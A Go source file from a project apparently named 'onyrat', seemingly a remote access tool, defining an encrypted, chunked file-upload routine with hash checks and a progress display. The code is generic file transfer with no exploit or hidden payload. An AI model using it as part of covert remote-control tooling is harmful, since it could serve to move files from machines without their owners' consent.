package transfer

import (
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"

	"github.com/Onyz107/onyrat/internal/infobar"
	"github.com/Onyz107/onyrat/internal/logger"
	"github.com/Onyz107/onyrat/pkg/network"
)

func Upload(comm network.Communicator, streamManager *network.StreamManager, fileName string, ctx context.Context) error {
	inCtx, cancel := context.WithCancelCause(ctx)
	defer cancel(nil)

	stream, err := streamManager.OpenStream(downloadStream, 20*time.Second)
	if err != nil {
		return fmt.Errorf("failed to open download stream: %w", err)
	}
	defer stream.Close()

	fileName = filepath.Clean(fileName)

	// Get a handle to the file
	file, err := os.OpenFile(string(fileName), os.O_RDONLY, 0600)
	if err != nil {
		return fmt.Errorf("failed to open target file: %w", err)
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		return fmt.Errorf("failed to get file size: %w", err)
	}

	// Send the file's information (file size, file hash)
	informationBuf := smallBufPool.Get().([]byte)
	defer smallBufPool.Put(informationBuf)

	binary.BigEndian.PutUint64(informationBuf[:8], uint64(fileInfo.Size()))
	computedHash, err := getFileHash(file)
	if err != nil {
		return fmt.Errorf("failed to compute file hash: %w", err)
	}
	copy(informationBuf[8:], computedHash)

	fileSize := uint64(fileInfo.Size())
	fileHash := computedHash

	logger.Log.Debugf("File size: %d, file hash: %x", fileSize, fileHash)

	if err := comm.SendEncrypted(stream, informationBuf[:32+8], 15*time.Second); err != nil {
		return fmt.Errorf("failed to send file information: %w", err)
	}

	// Open a stream and start sending
	w, err := comm.NewStreamedEncryptedSender(stream, 0)
	if err != nil {
		return fmt.Errorf("failed to open a sending stream: %w", err)
	}
	defer w.Close()

	start := time.Now()
	var (
		total    int64
		speedMBs float64
		pct      int
	)

	update := infobar.InfoStatus(fmt.Sprintf("Starting upload of: %s", fileName))

	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	go func() {
		for {
			select {

			case <-ticker.C:
				update(fmt.Sprintf("Uploading %s: %d%% (%.2f MB/s)", fileName, pct, speedMBs))

			case <-inCtx.Done():
				return
			}
		}
	}()

	for total < int64(fileSize) {
		select {

		case <-inCtx.Done():
			if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
				return err
			}

		default:
			n, err := io.CopyN(w, file, 32*1024) // 32KB is the default of io.Copy
			total += n

			elapsed := time.Since(start).Seconds()
			speedMBs = float64(total) / (1024 * 1024) / elapsed
			pct = int(float64(total) / float64(fileSize) * 100)

			if err != nil && err != io.EOF {
				cancel(fmt.Errorf("failed to upload streamed file: %w", err))
				continue
			}

			if err == io.EOF {
				cancel(nil)
			}

		}

	}

	cancel(nil)
	update(fmt.Sprintf("Upload of %s is complete", fileName))
	time.Sleep(5 * time.Second)
	update("")

	return nil
}
